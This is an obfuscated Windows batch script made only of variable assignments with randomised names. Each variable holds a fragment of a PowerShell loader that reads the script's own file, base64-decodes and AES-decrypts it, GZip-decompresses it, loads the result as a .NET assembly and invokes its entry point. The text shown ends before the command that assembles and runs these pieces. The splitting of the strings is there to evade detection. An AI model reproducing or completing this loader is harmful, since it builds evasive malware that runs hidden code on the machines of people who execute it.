@echo off
set "ZtlIVqlDtt=we"
set "fwnbmDdSel=ws"
set "QXMCrWZJED=po"
set "ZLsqiJKkNB=32"
set "QHNEwbqArm= C"
set "XAlyrTNVyF=ow"
set "oSolUjCMJg=:\"
set "emIIFXiTer=s\"
set "qhqyZFJKQw=in"
set "hJlyNGQqkt=ll"
set "gpkTKSvTqD=Po"
set "guNfQCbXTo=.e"
set "EfehjQHaCG=st"
set "bPpkMTNNYz=do"
set "LcgsPHYrOW=py"
set "rowVOsGEIU=xe"
set "xTwvAgdWCI=ll"
set "ZZtqzEyyah=we"
set "OGMGabufCf=he"
set "fERWaMNlkQ=\v"
set "tOJMaZiAzP=\W"
set "snPbLQzZmL=Sy"
set "MoVPJcFLmI=rs"
set "BRGEpMEvzT=he"
set "qSyUzeIcKp=Wi"
set "lpBTBuTHQy=y "
set "ZcZgJrXgyD=0\"
set "BxspZiEwIB=nd"
set "luBZJTTolw=rS"
set "YgITchtPbN=1."
set "rNEfloPKJb=em"
set "PsaeCnaDKG=co"
set "Wfanlcdxbd= /"
set "xxvXjGZAYM=cd"
set "PqMcuCfTue= %~dp0"
set "jyYGMTsdHu='[-1"
set "YhQHgTQqNY=comp"
set "wsWruQnqox=-joi"
set "pFGAioSxoy=ring"
set "QZySjOdnbl=$GHP"
set "CjPzqtumem=rofi"
set "bfevCEziCX=.Dis"
set "MnDiGbISBR=Comp"
set "CejXXnUJSM=oArr"
set "vLZCCUEHuZ=($KC"
set "nSdlBedfTx=oint"
set "SltuisGqst=yste"
set "IgYgbmMOav=.Sec"
set "VMxNWFzwmc=esaB"
set "pLzJunYxyg=CFxo"
set "MqKhythIYA=tS46"
set "cmSjszDVtX=.Cop"
set "cTNcbFpvAg=rt]:"
set "FWifHiUwcC=aoM "
set "kKZDzbXnBf=$rvj"
set "qiPJAcvEQa=.Cry"
set "EAuTzxMKaZ==');"
set "JFmdMUFgnT=::De"
set "oNxCMgyihN=, (,"
set "FQawxcjeEV=t Sy"
set "TyCECsRGEl=y]::"
set "sljrFfmOHO=tsWi"
set "cEChiVEmTo=bJ, "
set "nEDwJRrgLu=Star"
set "jKTwqaFABa=tryP"
set "ogMATPvCQT=zHhH"
set "MRQfCEwGmb=Bk.D"
set "TPKnbglZpd=em.C"
set "hZrtJzTjHY=$QKa"
set "opeZpqpLxU=KChb"
set "rIQvhLZmuX=nage"
set "chBDsPsPzM=in);"
set "ShstDBxNAm= [st"
set "hTpDJSDFhX=ode]"
set "WupiQLKDOa=eMVs"
set "qmmwUGKKDY= [Sy"
set "xHYdXJXeHQ=16] "
set "UcdZzgblwt=..-1"
set "ExwrTdfMTf=gth)"
set "hCYChCxmMV=se()"
set "afUNxbxdJy=mQoP"
set "EuHOaIhXty=)))"
set "LWSMGuymno=rity"
set "SwVEeUFsPb='gni"
set "oJHJnfmINT=lt.T"
set "wSLqAliVgr=kOCi"
set "KOktPZNTCi=ck($"
set "QfGBuCBwRB=.Cre"
set "eHzsBsygza=Bmor"
set "WpwpypxZFt=ose("
set "FjbqJPSEOq=ress"
set "jihUnXrocN=1] -"
set "JZAPniZqjy=gMod"
set "LjyTFDmBCD=;$gP"
set "OPdkNqDvxF=OhlP"
set "EIIZUXTygI=File"
set "uEcxhRvjSx=m(, "
set "JQDWxGvSes='[-1"
set "ZceoRHQCns=();$"
set "cOEwTvktgz=ion."
set "LTEFrBzwKQ=;$QK"
set "OcFclpGGRl=pose"
set "yxXhwLfwsO=ing("
set "mMNoRAqMGB=stem"
set "JMqYaPQJoU=6] -"
set "bbaMmxiaFX=('Tg"
set "jclKTXwbBh=form"
set "mUMTRKBnkR=QoPD"
set "XUTIPZNHQG=hbr."
set "jzwPHVGDdD=$CDQ"
set "PQktaAKQWW=Syst"
set "cZEvfSTnyJ=oM.T"
set "CkqYrskVrs=;$QK"
set "lLyQQAAdBk=ect "
set "CKxPeeBBLH=..-1"
set "mIyjXDGCPV=V = "
set "nMMnTlkjTq=.-16"
set "wkLHrQjBqk=y.Ci"
set "YwCNmeRzIe=-nop"
set "CNzKdhtwQA=] -j"
set "MMoOaoAmsc=3); "
set "uaETinKUoj=Secu"
set "CktRKfAkbP=yste"
set "HgNWvWVkJh=ke($"
set "vAOAHmoLiS=.Key"
set "mwOSAUAKWO= '')"
set "EXAbSDCMuV=morF"
set "bplXmZcIxP=vjBk"
set "JCGxchGeyY=lt ="
set "QjQKxPDVpl=-4] "
set "ebvptEvEOh=l5E7"
set "GoyfMiyJwR=ptor"
set "GaVYpsEmGb=$cZA"
set "nTkQIFCSSy=n = "
set "xMxuhecxct=embl"
set "BhjyAcOnZZ=raph"
set "OuKDUeTmPZ=vert"
set "RjIAtUIlkp=[]] "
set "dvXlDCbJHB=Disp"
set "gjTqIQWRLq=ose("
set "KrOGBZrKRH=Invo"
set "fdvFuqxUBZ=y.Cr"
set "ZoZZvqYoZV=k; }"
set "YaxabsGxyQ=ddin"
set "wRUEPOGtAB=);$r"
set "zZgytHPvWB=.Ass"
set "aWKqfQMEZc== [S"
set "UYkLxBmluB=pres"
set "FvGTHSpmnu=.Con"
set "hEvTzKgerH=Obje"
set "XTcFYgpeAr=L4Yi"
set "wLPjZnUykN=.Mem"
set "zAxNIzDPzo=F'[-"
set "lcanBMmMlz=$kOC"
set "baMMnipDUM=Stre"
set "vwKOGvdUex=PKCS"
set "pqNxJRTqgH=:: '"
set "qxwjjlHYuc=rtS4"
set "IhUdOPfnaO=DQlt"
set "vaVJFrmwdv=Comp"
set "yglqyqBqrZ=YxVw"
set "IJCaNXtQaJ=Conv"
set "xMdVpbefNQ=('%*'"
set "AhGNxqPnob=GHPH"
set "IiixjZxcCz=ress"
set "VOiVsOyhNO=flec"
set "xxjMomllwv=PTtG"
set "TYbkooeFiw=J = "
set "fhONZsxNUu=ress"
set "BoRhjNgqbU=OCin"
set "dIOMDgvuyG=RmAx"
set "bFskzYHhzJ=yste"
set "xcgcRFpQmx=d;$m"
set "zzhsFYBxfC=dj0C"
set "OWvwHnIzRE=r.Su"
set "xxXcJlmaps=ay()"
set "JZcvxLdKNy=am;$"
set "imhdRBJdnk=; };"
set "brockZzgUI=lit("
set "XSGPoNihJs=hbr "
set "NZacZPcXVK=  $X"
set "OtzlOLUqsI=AbJ."
set "RZoIniiDbE=gnir"
set "kdkgNKsvqZ=::('"
set "dPUTajiQcb=();$"
set "bIswzOjsUR=nirt"
set "fSXXgAIJJA=('%~f0'"
set "lVIZqBqFZO= = $"
set "zPFPqRXTAD=comm"
set "ioYHYFLsLL=hy.A"
set "FyYOnMLkjV=e = "
set "aCEhgAyCzn=.Mod"
set "vkPAuOcowZ=gsYZ"
set "CRuHescZkz=ert]"
set "cQeqGNDVMh=ment"
